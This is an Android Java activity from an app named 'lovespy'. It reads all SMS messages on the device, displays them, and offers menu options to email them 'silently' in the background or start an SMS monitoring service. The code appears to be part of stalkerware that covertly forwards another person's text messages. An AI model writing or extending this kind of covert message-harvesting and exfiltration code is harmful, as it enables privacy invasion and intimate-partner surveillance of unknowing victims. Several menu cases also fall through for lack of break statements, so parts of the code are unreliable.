package com.example.lovespy.app.ui;

import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Bundle;
import android.view.Menu;
import android.view.MenuItem;
import android.widget.ArrayAdapter;
import android.widget.ListView;

import com.example.lovespy.app.R;
import com.example.lovespy.app.email.EmailHelper;
import com.example.lovespy.app.email.EmailSending;
import com.example.lovespy.app.service.SmsService;
import com.example.lovespy.app.settings.SettingsActivity;
import com.example.lovespy.app.sms.SmsReader;

public class SmsListActivity extends Activity {

    private static final Uri STATUS_URI = Uri.parse("content://sms");
    private String mLetter;
    //private SmsSentObserver mSmsSentObserver;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.sms_list);
        SmsReader smsReader = new SmsReader(this);
        mLetter = smsReader.getSmsList();
        //mSmsSentObserver = new SmsSentObserver(new Handler(), this);
        //getContentResolver().registerContentObserver(STATUS_URI, true, mSmsSentObserver);
        ListView listView = (ListView) findViewById(R.id.listView);
        String[] items = {mLetter};
        ArrayAdapter<String> adapter = new ArrayAdapter<String>(this, android.R.layout.simple_list_item_1, items);
        listView.setAdapter(adapter);
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        //getContentResolver().unregisterContentObserver(mSmsSentObserver);
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        getMenuInflater().inflate(R.menu.sms_menu, menu);
        return super.onCreateOptionsMenu(menu);
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        switch (item.getItemId()) {
            case R.id.send_message_via_chooser:
                EmailSending.sendViaChooser(this);
                return true;
            case R.id.send_message_silently:
                new AsyncTask<Void,Void,Void>() {
                    @Override
                    protected Void doInBackground(Void... voids) {
                        EmailHelper.sendEmailSilently(mLetter);
                        return null;
                    }
                }.execute();
            case R.id.start_service:
                startService();
            case R.id.settings:
                Intent intent = new Intent(this, SettingsActivity.class);
                startActivity(intent);
            default:
        }
        return super.onOptionsItemSelected(item);
    }

    public void startService() {
        Intent intent = new Intent(this, SmsService.class);
        startService(intent);
    }
}
